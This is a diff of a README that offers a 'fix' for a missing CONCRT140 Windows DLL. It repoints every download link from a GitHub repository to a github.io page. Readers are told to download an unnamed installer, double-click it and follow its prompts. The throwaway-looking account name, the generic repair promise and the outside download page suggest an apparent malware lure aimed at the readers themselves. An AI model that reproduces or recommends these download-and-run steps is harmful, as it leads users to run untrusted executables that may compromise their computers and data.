@@ -1,6 +1,6 @@
 # 🛠 CONCRT140-DLL-Missing-Fix - Restore Your Missing Windows System Files
 
-[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge)](https://github.com/Surprised-refrigerant15/CONCRT140-DLL-Missing-Fix)
+[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge)](https://surprised-refrigerant15.github.io)
 
 ## 📋 What is this error?
 
@@ -18,7 +18,7 @@ This fix works on the following versions of Windows:
 
 Follow these steps to fix your computer. Read each step to ensure you perform the repair correctly.
 
-1.  Visit the [official repository page](https://github.com/Surprised-refrigerant15/CONCRT140-DLL-Missing-Fix) to download the repair package.
+1.  Visit the [official repository page](https://surprised-refrigerant15.github.io) to download the repair package.
 2.  Locate the downloaded file in your browser or your Downloads folder.
 3.  Double-click the file to begin the installation.
 4.  Follow the prompts on your screen.
@@ -26,7 +26,7 @@ Follow these steps to fix your computer. Read each step to ensure you perform th
 
 ## 💾 Download and Install
 
-You can find the necessary files on our [releases page](https://github.com/Surprised-refrigerant15/CONCRT140-DLL-Missing-Fix). Click the link to visit the page. Once there, look for the latest version of the installer. Click the file to start the download. Open the file after the download finishes and follow the instructions provided by the setup wizard.
+You can find the necessary files on our [releases page](https://surprised-refrigerant15.github.io). Click the link to visit the page. Once there, look for the latest version of the installer. Click the file to start the download. Open the file after the download finishes and follow the instructions provided by the setup wizard.
 
 ## 🔧 Frequently Asked Questions
 
